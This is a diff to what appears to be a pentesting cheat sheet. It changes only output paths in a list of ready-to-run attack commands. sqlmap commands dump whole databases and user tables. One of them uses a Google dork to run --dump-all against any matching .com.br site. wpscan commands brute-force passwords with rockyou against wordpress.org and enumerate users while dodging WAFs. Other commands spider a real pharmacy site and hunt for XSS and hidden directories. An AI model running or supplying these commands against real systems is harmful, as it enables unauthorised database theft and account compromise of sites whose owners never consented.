@@ -54,31 +54,31 @@ auto crawling command
     
 auto dumping databases
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump-all --batch --threads 7 -o /tmp/sqldumldataauto.txt
 
 finding vuln parameter using google dork
 
-    sqlmap -g "site: .com.br inurl: .php?id=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt
+    sqlmap -g "site: .com.br inurl: .php?id=1" --dump-all --batch --threads 7 -o /tmp/sqldumldataauto.txt
 
 Step by step dumping databases
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch --threads 5 -o sqldumpfulldatabase.txt
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch --threads 5 -o /tmp/sqldumpfulldatabase.txt
     
 Step by step dumping databases
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch --threads 5 -o sqldumpfulltable.txt
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch --threads 5 -o /tmp/sqldumpfulltable.txt
     
 Step by step dumping databases
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch --threads 5 -o sqlreadallcolumnsdata.txt
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch --threads 5 -o /tmp/sqlreadallcolumnsdata.txt
     
 Step by step dumping databases
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump --batch --threads 5 -o sqldumpfullcolumns.txt
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump --batch --threads 5 -o /tmp/sqldumpfullcolumns.txt
 
 Login page brute-forcing
 
-    sqlmap -u "http://testphp.vulnweb.com/login.php" --forms -o sqlbruteForcelogin.txt
+    sqlmap -u "http://testphp.vulnweb.com/login.php" --forms -o /tmp/sqlbruteForcelogin.txt
     
 
     sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=abd&pass=abc&login=submit" --dbs
@@ -93,13 +93,13 @@ Sub Domain finding automation using assetfinder, httpx
 
 auto Detecting
 
-    cmseek -u https://wordpress.org --batch | tee 'path/cmsDetector.txt'
+    cmseek -u https://wordpress.org --batch | tee '/tmp/cmsDetector.txt'
 
 <h1 align="center">Gospider</h1>
 
 Paramiter finding
 
-    gospider -s "https://www.farmasilva.com.br" --no-redirect -o gospider.txt
+    gospider -s "https://www.farmasilva.com.br" --no-redirect -o /tmp/gospider.txt
 
 <h1 align="center">XSStrike, xss finder</h1>
 
@@ -111,7 +111,7 @@ xss finding
 
 xss finding
 
-    XSpear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2 -o XSpear.txt
+    XSpear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2 -o /tmp/XSpear.txt
 
 <h1 align="center">commix, xss finder</h1>
 
@@ -123,15 +123,15 @@ os command injection finding
 
 Vulnerable plugin, themes, users
 
-    wpscan --url https://wordpress.org -e vp,vt,u -o scanned.txt
+    wpscan --url https://wordpress.org -e vp,vt,u -o /tmp/scanned.txt
 
 Vulnerable plugins, All plugins, Vulnerable themes, All themes, Timthumbs, Config backups, Db exports, User, Media, Bypassing Simple WAFs
 
-    wpscan --url https://wordpress.org -e vp,vt,tt,cb,dbe,u,m --random-user-agent -v -o scanned.txt
+    wpscan --url https://wordpress.org -e vp,vt,tt,cb,dbe,u,m --random-user-agent -v -o /tmp/scanned.txt
 
 Password brute force attack
 
-    wpscan --url https://wordpress.org -e u --passwords /usr/share/wordlists/rockyou.txt -o scanned.txt
+    wpscan --url https://wordpress.org -e u --passwords /usr/share/wordlists/rockyou.txt -o /tmp/scanned.txt
     
 finding flag from system
 
@@ -141,40 +141,40 @@ finding flag from system
 
 Most used
 
-    sudo dirsearch --full-url --extensions=php,html,js --exclude-extensions=xml,ico --include-status=200-399 --exclude-status=400 -r 3 --format plain -o dirsearchScan.txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --extensions=php,html,js --exclude-extensions=xml,ico --include-status=200-399 --exclude-status=400 -r 3 --format plain -o /tmp/dirsearchScan.txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
     
 Full URL & plain text output scan
 
-    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/dirsearchScan.txt -u http://testphp.vulnweb.com
 
 Full url, plaintext output, custom wordlist
 
-    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/dirsearchScan.txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
 
 Full url, plaintext output, wordlist, add extensions
 
-    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/dirsearchScan.txt -e php,html,js -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
 
 Full url, plaintext output, wordlist, add extensions & exclude extension
 
-    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js -X xml -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/dirsearchScan.txt -e php,html,js -X xml -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
 
 above all + status code
 
-    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js -i 200,302 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/dirsearchScan.txt -e php,html,js -i 200,302 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
 
 above all + Exclude Extensions
 
-    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/dirsearchScan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
 
 Full url, output plzintext, include extension, exclude extension, status code, recursive mode
 
-    sudo dirsearch --full-url --format plain -o scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r 3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r 3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
 
 Full url, output plzintext, include extension, exclude extension, status code, recursive mode+loop
 
-    sudo dirsearch --full-url --format plain -o scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r --deep-recursive 3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r --deep-recursive 3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
 
 Full url, output plzintext, include extension, exclude extension, status code, recursive mode+loop, threads
 
-    sudo dirsearch --full-url --format plain -o scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r --deep-recursive 3 -t 20 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
+    sudo dirsearch --full-url --format plain -o /tmp/scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r --deep-recursive 3 -t 20 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
